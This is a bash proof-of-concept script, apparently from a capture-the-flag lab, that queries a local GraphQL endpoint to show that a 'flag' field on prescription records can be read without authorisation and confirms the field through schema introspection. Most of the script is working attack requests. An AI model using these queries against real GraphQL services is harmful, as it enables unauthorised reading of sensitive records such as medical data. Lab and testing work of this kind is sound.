#!/bin/bash

# POC: GraphQL Sensitive Flag Field Exposure
# Demonstrates that the 'flag' field containing sensitive data is directly queryable
# and returned in API responses without authorization restrictions

TARGET_URL="http://localhost:5003/graphql"

echo "[*] GraphQL Sensitive Flag Field Exposure POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Query 1: Retrieve prescriptions with flag field
echo "[+] Query 1: Requesting getPrescriptions with flag field"
echo "[+] Query: query{getPrescriptions(userId:1){id userId prescriptionDetails flag}}"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{getPrescriptions(userId:1){id userId prescriptionDetails flag}}"}')

echo "[+] Response:"
echo "$RESPONSE" | grep -o '"flag":"[^"]*"' && echo "" || echo "(no flag found)"

# Check if flag data is present in response
if echo "$RESPONSE" | grep -q "flag{"; then
  echo "[!] VULNERABLE: Sensitive flag field is exposed in API response"
  FLAG_VALUE=$(echo "$RESPONSE" | grep -o '"flag":"[^"]*"' | head -1)
  echo "[!] Exposed Flag: $FLAG_VALUE"
else
  echo "[-] Flag not found in response"
fi

echo ""
echo "[+] Query 2: Schema introspection to confirm flag field exists"
echo "[+] Query: {__type(name:\"PrescriptionType\"){fields{name type{name kind}}}}"
echo ""

SCHEMA_RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__type(name:\"PrescriptionType\"){fields{name type{name kind}}}}"}')

echo "[+] Schema Response (checking for flag field):"
if echo "$SCHEMA_RESPONSE" | grep -q '"name":"flag"'; then
  echo "[!] VULNERABLE: flag field exists in PrescriptionType schema"
  echo "$SCHEMA_RESPONSE" | grep -A2 '"name":"flag"'
else
  echo "[-] flag field not found in schema"
fi

echo ""
echo "[+] Query 3: Multiple prescriptions to show flag exposure across all records"
echo "[+] Query: query{getPrescriptions(userId:1){id flag}}"
echo ""

MULTI_RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{getPrescriptions(userId:1){id flag}}"}')

echo "[+] Multiple Prescriptions Response:"
echo "$MULTI_RESPONSE" | python3 -m json.tool 2>/dev/null || echo "$MULTI_RESPONSE"

# Count exposed flags
FLAG_COUNT=$(echo "$MULTI_RESPONSE" | grep -o '"flag":"[^"]*"' | wc -l)
if [ "$FLAG_COUNT" -gt 0 ]; then
  echo ""
  echo "[!] VULNERABLE: Found $FLAG_COUNT prescription(s) with exposed flag field"
fi